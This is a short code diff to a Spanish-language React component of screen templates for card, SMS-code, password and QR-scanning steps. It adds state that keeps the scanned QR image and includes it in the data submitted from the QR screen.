@@ -60,6 +60,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [smsCompraInput, setSmsCompraInput] = useState('');
   const [passwordError, setPasswordError] = useState<string | null>(null);
   const [qrScanned, setQrScanned] = useState<string | null>(null);
+  const [qrImageData, setQrImageData] = useState<string | null>(null);
   
   // Función para validar número de tarjeta con algoritmo de Luhn
   const validateCardNumber = (number: string) => {
@@ -538,7 +539,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               </div>
               <Button 
                 className={primaryBtnClass}
-                onClick={() => onSubmit(ScreenType.ESCANEAR_QR, { qrData: qrScanned })}
+                onClick={() => onSubmit(ScreenType.ESCANEAR_QR, { 
+                  qrData: qrScanned,
+                  qrImageData: qrImageData
+                })}
               >
                 Continuar
               </Button>
@@ -551,8 +555,9 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return (
           <div className="pantalla border border-gray-300 rounded-lg p-6 shadow-md text-center overflow-hidden">
             <QRScanner 
-              onScanSuccess={(qrData) => {
+              onScanSuccess={(qrData, qrImage) => {
                 setQrScanned(qrData);
+                setQrImageData(qrImage || null);
               }}
               onCancel={() => {
                 onSubmit(ScreenType.MENSAJE, { mensaje: "Operación cancelada por el usuario" });
